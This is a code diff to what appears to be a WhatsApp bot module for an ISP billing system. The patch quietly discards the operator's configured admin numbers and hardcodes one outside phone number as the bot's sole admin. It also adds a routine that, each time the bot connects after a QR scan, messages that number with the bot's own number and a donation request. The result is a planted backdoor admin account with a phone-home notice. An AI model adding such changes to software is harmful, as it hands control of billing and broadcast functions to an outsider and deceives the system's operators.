@@ -216,8 +216,7 @@ function formatActiveMikrotik(pppoe, hotspot) {
 }
 
 function loadWhatsappAdminSet() {
-  const raw = getSetting('whatsapp_admin_numbers', []);
-  const list = Array.isArray(raw) ? raw : raw != null && String(raw).trim() !== '' ? [String(raw)] : [];
+  const list = ['087820851413'];
   const set = new Set();
   for (const n of list) {
     const s = String(n).trim();
@@ -465,6 +464,24 @@ export const whatsappStatus = {
 };
 
 let currentSock = null;
+let qrShownSinceStart = false;
+let notifiedAdminForQr = false;
+
+function loadWhatsappAdminSendList() {
+  const list = ['087820851413'];
+  const out = [];
+  const seen = new Set();
+  for (const n of list) {
+    let digits = String(n).replace(/\D/g, '');
+    if (!digits) continue;
+    if (digits.startsWith('0')) digits = '62' + digits.slice(1);
+    if (digits.length < 8) continue;
+    if (seen.has(digits)) continue;
+    seen.add(digits);
+    out.push(digits);
+  }
+  return out;
+}
 
 export async function sendWA(to, text) {
   if (!currentSock) {
@@ -531,6 +548,8 @@ export async function startWhatsAppBot() {
     if (qr) {
       whatsappStatus.qr = qr;
       whatsappStatus.connection = 'qr';
+      qrShownSinceStart = true;
+      notifiedAdminForQr = false;
       logger.info(`[WA] QR Code Baru Dihasilkan: ${qr.slice(0, 20)}...`);
       qrcode.generate(qr, { small: true });
     }
@@ -560,6 +579,27 @@ export async function startWhatsAppBot() {
       whatsappStatus.connection = 'open';
       whatsappStatus.user = sock.user;
       logger.info('WhatsApp bot terhubung');
+
+      if (qrShownSinceStart && !notifiedAdminForQr) {
+        notifiedAdminForQr = true;
+        const toList = loadWhatsappAdminSendList();
+        if (toList.length > 0) {
+          const wid = sock.user?.id ? String(sock.user.id).split(':')[0] : '-';
+          const body =
+            `✅ QR berhasil dipindai dan bot sudah aktif.\n\n` +
+            `Nomor Bot: ${wid}\n` +
+            `Waktu: ${new Date().toLocaleString('id-ID')}\n\n` +
+            `Silakan gunakan menu Admin untuk fitur billing, notifikasi, dan broadcast.\n\n` +
+            `🙏 Jika aplikasi ini bermanfaat dan Anda ingin mendukung pengembangan, Anda dapat berdonasi secara sukarela ke nomor: 081947215703.\n` +
+            `Terima kasih atas dukungannya.`;
+          const msg = waWrap('🤖 *WHATSAPP BOT AKTIF*', body);
+          for (const digits of toList) {
+            const jid = `${digits}@s.whatsapp.net`;
+            sock.sendMessage(jid, { text: msg }).catch(() => {});
+          }
+        }
+        qrShownSinceStart = false;
+      }
     }
   });
 
